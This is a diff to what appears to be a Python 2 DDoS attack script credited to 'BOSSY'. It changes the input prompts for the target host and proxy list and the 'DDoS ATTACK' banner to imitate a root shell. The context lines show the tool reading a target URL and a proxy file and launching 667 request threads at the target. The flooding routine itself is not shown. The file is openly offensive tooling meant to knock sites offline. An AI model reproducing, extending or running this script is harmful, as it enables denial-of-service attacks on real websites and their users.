@@ -383,9 +383,9 @@ print("               /_/  /_/\____/_/  \____/___/  ")
 print("                        Instagram : @0zctn ")                   
 print(" ")
 
-url = raw_input(" Host : ")
+url = raw_input(" root@bossy:~# [Host] : ")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
-in_file = open(raw_input(" Proxy : "),"r")
+in_file = open(raw_input(" root@bossy:~# [Proxy] : "),"r")
 proxyf = in_file.read()
 in_file.close()
 listaproxy = proxyf.split('\n')
@@ -399,7 +399,7 @@ for x in xrange(667):
     print "Requests to [ " + str(url)+ " ]---Whit---" + str(x) + "---Thread!"
    
 print \
-"""DDoS ATTACK By BOSSY"""
+""" root@bossy:~# DDoS ATTACK By BOSSY """
 print '---------------------------------------------------'
 nload = 0
 while not nload:
